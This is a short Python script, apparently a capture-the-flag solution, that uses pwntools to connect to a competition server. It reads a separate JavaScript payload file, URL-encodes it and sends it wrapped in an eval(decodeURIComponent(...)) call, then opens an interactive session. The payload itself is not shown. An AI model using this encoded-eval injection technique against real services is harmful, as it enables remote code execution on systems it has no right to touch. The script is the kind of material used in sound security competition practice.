from pwn import * 
import urllib.parse
r = remote("chal.competitivecyber.club", 8889)
with open("pwn.js","r") as f:
    payload = f.read()

r.sendline(f"eval(decodeURIComponent(`{urllib.parse.quote(payload)}`))")
r.interactive()

